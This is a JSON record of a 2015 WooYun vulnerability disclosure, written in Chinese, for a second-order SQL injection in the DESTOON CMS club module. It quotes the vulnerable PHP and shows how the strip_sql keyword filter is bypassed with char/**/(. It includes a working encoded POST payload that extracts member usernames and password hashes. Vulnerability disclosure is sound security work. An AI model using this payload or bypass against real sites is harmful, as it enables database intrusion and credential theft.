{"id": 82347, "wybug_id": "wooyun-2015-0151369", "wybug_title": "destoon最新版注入(绕过过滤出任意数据)", "wybug_corp": "DESTOON", "wybug_author": "玉林嘎", "wybug_date": "2015-11-03 11:44", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-06：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 我会告诉你是三次注入么. 详细说明：  destoon最新版 漏洞文件:/module/club/my_group.inc.php\ncase 'add':\t\tif($MG['club_group_limit'] && $limit_used >= $MG['club_group_limit']) dalert(lang($L['info_limit'], array($MG['club_group_limit'], $limit_used)), $MODULE[2]['linkurl'].$DT['file_my'].'?mid='.$mid.'&job='.$job);\t\t$need_captcha = $MOD['captcha_group'] == 2 ? $MG['captcha'] : $MOD['captcha_group'];\t\t$need_question = $MOD['question_group'] == 2 ? $MG['question'] : $MOD['question_group'];\t\tif($submit) {\t\t\t$msg = captcha($captcha, $need_captcha, true);\t\t\tif($msg) dalert($msg);\t\t\t$msg = question($answer, $need_question, true);\t\t\tif($msg) dalert($msg);\t\t\t$post['username'] = $_username;\t\t\tif($do->pass($post)) {\t\t\t\t$CAT = get_cat($post['catid']);\t\t\t\tif(!$CAT) dalert(lang($L['group'], array($CAT['catname'])));\t\t\t\t$post['addtime'] = $post['level'] = $post['fee'] = 0;\t\t\t\t$post['style'] = $post['template'] = $post['note'] = $post['filepath'] = '';\t\t\t\t$need_check =  $MOD['check_group'] == 2 ? $MG['check'] : $MOD['check_group'];\t\t\t\t$post['status'] = get_status(3, $need_check);\t\t\t\t$post['hits'] = 0;\t\t\t\t$post['areaid'] = $cityid;\t\t\t\t$post['filepath'] = '';\t\t\t\t$do->add($post);\t\t\t\t$msg = $post['status'] == 2 ? $L['success_check'] : $L['success_add'];\t\t\t\t$js = '';\t\t\t\tset_cookie('dmsg', $msg);\t\t\t\t$forward = $MODULE[2]['linkurl'].$DT['file_my'].'?mid='.$mid.'&job='.$job.'&status='.$post['status'];\t\t\t\t$msg = '';\t\t\t\t$js .= 'window.onload=function(){parent.window.location=\"'.$forward.'\";}';\t\t\t\tdalert($msg, '', $js);\t\t\t} else {\t\t\t\tdalert($do->errmsg, '', ($need_captcha ? reload_captcha() : '').($need_question ? reload_question() : ''));\t\t\t}\t\t} else {\t\t\tforeach($do->fields as $v) {\t\t\t\t$$v = '';\t\t\t}\t\t\t$content = '';\t\t\t$catid = intval($catid);\t\t\t$areaid = $cityid;\t\t\t$item = array();\t\t}\tbreak;case 'edit':\t\t$itemid or message();\t\t$do->itemid = $itemid;\t\t$item = $do->get_one();\t\tif(!$item || $item['username'] != $_username) message();\t\tif($submit) {\t\t\t$post['username'] = $_username;\t\t\tif($do->pass($post)) {\t\t\t\t$post['catid'] = $item['catid'];\t\t\t\t$post['title'] = $item['title'];\t\t\t\t$post['level'] = $item['level'];\t\t\t\t$post['fee'] = $item['fee'];\t\t\t\t$post['style'] = $item['style'];\t\t\t\t$post['template'] = $item['template'];\t\t\t\t$post['filepath'] = $item['filepath'];\t\t\t\t$post['status'] = $item['status'];\t\t\t\t$post['hits'] = $item['hits'];\t\t\t\t$do->edit($post);\t\t\t\tset_cookie('dmsg', $L['success_edit']);\t\t\t\tdalert('', '', 'parent.window.location=\"'.$forward.'\"');\t\t\t} else {\t\t\t\tdalert($do->errmsg);\t\t\t}\t\t} else {\t\t\textract($item);\t\t}\tbreak;\n首先通过add操作 可引入\\而在edit操作中 $item = $do->get_one(); 直接取出 $item['title'] 传给$post 参数 进入edit函数 无任何过滤而在文件:/module/club/group.class.php (add() edit()所在文件)\nfunction edit($post) {\t\t$this->delete($this->itemid, false);\t\t$post = $this->set($post);\t\t$sql = '';\t\tforeach($post as $k=>$v) {\t\t\tif(in_array($k, $this->fields)) $sql .= \",$k='$v'\";\t\t}        $sql = substr($sql, 1);\t    $this->db->query(\"UPDATE {$this->table} SET $sql WHERE itemid=$this->itemid\");\t\t$this->update($this->itemid);\t\tclear_upload($post['thumb']);\t\treturn true;\t}\n$post数组里面不仅有之前从数据库取出，也通过post传入了 $post[thumb] $post[content] 而2个变量 在后面的update操作刚好在$title后面 于是通过$title引入\\ 转义' 后面一个参数在加以控制进行注入漏洞大概原理如此 其他下面说   漏洞证明：  证明:注册个企业会员 创建商圈 title处引入\\\n\n然后在编辑\n\n然后你会发现thumb 和 content传入先后 就是他们update顺序的先后 而thumb会有个is_url的检测不可控制 所以先传入content 即可解决接下来是绕过过滤的问题了\nfunction strip_sql($string, $type = 1) {\t$match = array(\"/union/i\",\"/where/i\",\"/having/i\",\"/outfile/i\",\"/dumpfile/i\",\"/0x([a-f0-9]{2,})/i\",\"/select([\\s\\S]*?)from/i\",\"/select([\\s\\*\\/\\-\\{\\(\\+@`])/i\",\"/update([\\s\\*\\/\\-\\{\\(\\+@`])/i\",\"/replace([\\s\\*\\/\\-\\{\\(\\+@`])/i\",\"/delete([\\s\\*\\/\\-\\{\\(\\+@`])/i\",\"/drop([\\s\\*\\/\\-\\{\\(\\+@`])/i\",\"/load_file[\\s]*\\(/i\",\"/substring[\\s]*\\(/i\",\"/substr[\\s]*\\(/i\",\"/left[\\s]*\\(/i\",\"/right[\\s]*\\(/i\",\"/mid[\\s]*\\(/i\",\"/concat[\\s]*\\(/i\",\"/concat_ws[\\s]*\\(/i\",\"/make_set[\\s]*\\(/i\",\"/ascii[\\s]*\\(/i\",\"/bin[\\s]*\\(/i\",\"/oct[\\s]*\\(/i\",\"/hex[\\s]*\\(/i\",\"/ord[\\s]*\\(/i\",\"/char[\\s]*\\(/i\",\"/conv[\\s]*\\(/i\");\t$replace = array('unio&#110;','wher&#101;','havin&#103;','outfil&#101;','dumpfil&#101;','0&#120;\\\\1','selec&#116;\\\\1fro&#109;','selec&#116;\\\\1','updat&#101;\\\\1','replac&#101;\\\\1','delet&#101;\\\\1','dro&#112;\\\\1','load_fil&#101;(','substrin&#103;(','subst&#114;(','lef&#116;(','righ&#116;(','mi&#100;(','conca&#116;(','concat_w&#115;(','make_se&#116;(','asci&#105;(','bi&#110;(','oc&#116;(','he&#120;(','or&#100;(','cha&#114;(','con&#118;(');\tif($type) {\t\treturn is_array($string) ? array_map('strip_sql', $string) : preg_replace($match, $replace, $string);\t} else {\t\treturn str_replace(array('&#100;', '&#101;', '&#103;', '&#105;', '&#109;', '&#110;','&#112;', '&#114;', '&#115;', '&#116;', '&#118;', '&#120;'), array('d', 'e', 'g', 'i', 'm', 'n', 'p', 'r', 's', 't', 'v', 'x'), $string);\t}}\n细看你会发现这个过滤中所以 ascii( char( 的过滤方式存在问题 /char[\\s]*\\(/i 我们可以传入char/**/(1) 即可绕过 但是直接出数据不可能了 那我们更新好我们的语句再一次编辑 再进行注入 这样就是3次注入啦而且在edit() 中set() 中最后会进行次$post = dhtmlspecialchars($post);所以直接引入' 还是不行 还是只能引入\\ 2个参数注入但是content是永远从post直接获取的 于是重新挑选\n$post['catid'] = $item['catid'];$post['title'] = $item['title'];$post['level'] = $item['level'];$post['fee'] = $item['fee'];$post['style'] = $item['style'];$post['template'] = $item['template'];$post['filepath'] = $item['filepath'];$post['status'] = $item['status'];$post['hits'] = $item['hits'];\n我们挑选template 和  filepath 配合注入第一次编辑content 应该是\npost%5Bcontent%5D=,template=char/**/(92),filepath=char/**/(44,99,111,110,116,101,110,116,61,40,115,101,108,101,99,116,32,99,111,110,99,97,116,40,117,115,101,114,110,97,109,101,44,112,97,115,115,119,111,114,100,41,32,102,114,111,109,32,100,101,115,116,111,111,110,95,109,101,109,98,101,114,32,108,105,109,105,116,32,49,41,35)#\ntemplate 引入 \\ filepath则是\n,content=(select concat(username,password) from destoon_member limit 1)#\n\n\n注意 content在前 thumb在后\n\n之后再编辑一次 点进去就看到\n\n乌云编辑器\\被转义啦。。。 - -   修复方案：  修复   版权声明：转载请注明来源 玉林嘎@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-11-03 15:34 厂商回复： 感谢反馈 我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-03 11:51 |    \t\t镱鍚 \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:10        | 。。！)\t\t \n  前排    \n     2015-11-03 11:54 |    \t\t凌零1 \t\t\t( 普通白帽子  |\t\t\t        Rank:202 漏洞数:43        )\t\t \n  膜拜    \n     2015-11-03 13:33 |    \t\tU神 \t\t\t( 普通白帽子  |\t\t\t        Rank:1343 漏洞数:148        | 五个乌云币都不给我留着，兄弟们太小气了吧)\t\t \n  大家的通用都被我关注了一遍，太厉害了~嘎嘎    \n     2015-11-03 16:17 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1561 漏洞数:234        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @U神 诈尸啊    \n     2015-11-03 20:05 |    \t\t郭斯特 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:69        | GhostWin)\t\t \n  我会告诉你是三次注入么.    \n     2015-11-05 11:36 |    \t\tShAdow丶 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:13        | i am a fans of kimYeWon.)\t\t \n  噢噢噢噢 !    \n     2015-11-06 20:01 |    \t\t小鸟也疯狂 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 小鸟总有一天会变成大鸟！)\t\t \n  大师！    \n     2015-12-04 20:23 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 只是路过)\t\t \n  围观    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}